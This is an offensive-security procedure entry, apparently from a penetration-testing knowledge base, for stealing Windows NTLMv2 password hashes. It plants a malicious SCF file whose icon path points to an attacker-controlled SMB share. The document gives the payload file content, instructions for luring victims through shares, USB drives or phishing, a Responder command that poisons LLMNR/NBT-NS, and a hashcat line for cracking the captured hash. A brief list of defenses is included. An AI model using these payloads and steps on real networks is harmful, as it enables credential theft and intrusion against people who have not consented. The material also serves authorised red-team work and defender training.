---
id: 94bc9162-0aaf-45c9-8248-ebb1c91b33c8
name: Steal-NTLMv2-Hash-with-SCF-File-and-SMB
type: procedure
verified: true
submitted: false
created_at: '2019-10-15T18:34:31.285377+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credential Dumping]]'
sub_techniques: []
tags:
  - network
  - ntlm
commands:
  - '[[commands/responder-intercept-ntlm-hash]]'
platforms:
  - Windows
tools:
  - '[[tools/Responder]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Steal-NTLMv2-Hash-with-SCF-File-and-SMB

## Summary

This procedure exploits a vulnerability in Windows versions prior to 10 to steal NTLMv2 password hashes using Shell Command File (SCF) files over SMB. When a user browses a folder containing a malicious SCF file, Windows automatically loads it, triggering an SMB authentication attempt to a remote attacker-controlled server. The attacker intercepts the NTLMv2 hash using a tool like Responder without requiring user interaction beyond folder navigation.

## Description

SCF files are configuration files used by Windows Explorer for shell extensions, such as custom icons. Vulnerable Windows systems (typically versions before 10) automatically parse SCF files in directories and load referenced resources, including remote files via SMB. By crafting an SCF file that points to a non-existent icon on an attacker-controlled SMB share, the system authenticates using the current user's credentials when the folder is viewed in Explorer. This discloses the NTLMv2 hash, which can be captured and cracked offline to recover the plaintext password. This technique is useful in lateral movement or initial access scenarios where an attacker can place the SCF file on a shared drive or lure a user to a malicious share. It requires the target to use SMBv1 or v2 and have LLMNR or NBT-NS enabled for poisoning if needed.

## Requirements

1. Attacker machine on the same network segment as the target, with Responder installed and an SMB server capability (e.g., via Impacket or built-in).
2. Network access to host an SMB share accessible by the target.
3. Target running Windows 7, 8, or Server 2008/2012 (pre-Windows 10, where this auto-loading was patched).
4. LLMNR and NBT-NS enabled on the target (default in many enterprise environments).
5. Administrative access on attacker machine to run Responder as root.

## Defense

Defensive measures and detection strategies:

- Disable SMBv1 and enforce SMB signing to prevent relay attacks.
- Disable LLMNR and NBT-NS via Group Policy to reduce poisoning risks.
- Monitor for anomalous SMB authentication attempts from internal hosts using tools like Sysmon or Windows Event Logs (Event ID 4624 for logons).
- Implement application whitelisting to block execution of untrusted file types like SCF.
- Educate users on avoiding untrusted network shares and enable Protected View for files from the internet.

## Objectives

1. Create and deploy a malicious SCF file to trigger remote SMB authentication.
2. Intercept the NTLMv2 hash during the authentication process.
3. Capture the hash for offline cracking to obtain user credentials.
4. Expected outcome: Obtain a crackable NTLMv2 hash of a target user account.

## Instructions

### Step 1: Create the Malicious SCF File

**Context**: Generate the SCF file content that references a remote SMB path controlled by the attacker. This file will be automatically parsed by Windows Explorer, causing an authentication attempt to your SMB share.

**SCF Content** ([[codes/SCF-File-for-NTLMv2-Hash-Stealing]]):

```scf
[Shell]
Command=2
IconFile=\\$_ATTACKER_IP\files\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

> Save this content to a file with a .scf extension (e.g., icon.scf). The IconFile path points to a fake icon on your SMB share, triggering the hash disclosure. Replace $_ATTACKER_IP with your machine's IP. The file name and icon name do not matter as long as the SMB path is valid.

### Step 2: Deploy the SCF File to a Target Location

**Context**: Place the SCF file in a location where the target user will browse it, such as a network share, USB drive, or phishing-delivered folder. If using a remote SMB share, ensure your attacker machine is hosting the share to receive the authentication.

**Instructions**: 
- Set up an SMB share on your attacker machine (e.g., using `impacket-smbserver` or Windows sharing).
- Upload or copy the .scf file to the share root or a browsable folder.
- Lure the target user to access the share via Explorer (e.g., `\\ATTACKER_IP\share`).

> No specific command is needed for upload if using file copy; ensure the share is readable by the target.

### Step 3: Launch the Responder Listener

**Context**: Start Responder to poison name resolution protocols (LLMNR, NBT-NS, MDNS) and intercept the incoming NTLMv2 hash during the SMB authentication triggered by the SCF file.

**Command** ([[commands/responder-intercept-ntlm-hash]]):

```bash
responder -I $_INTERFACE
```

> Run this as root on your Kali/attacker machine. Specify the network interface facing the target (e.g., eth0). Responder will listen for events and capture hashes in its logs. Wait for the target to browse the folder containing the SCF file; the hash will appear in the output when authentication occurs.

### Step 4: Verify and Extract the Captured Hash

**Context**: Once the hash is captured, verify it from Responder's output and save it for cracking with tools like Hashcat.

**Instructions**: Monitor the Responder console for lines starting with [SMBv2] NTLMv2-SSP Hash. The hash format will be: username::domain:challenge:ntlm_hash:...

> Success is indicated by a new hash capture. Use the hash in offline cracking: `hashcat -m 5600 ntlmv2_hash.txt wordlist.txt`.
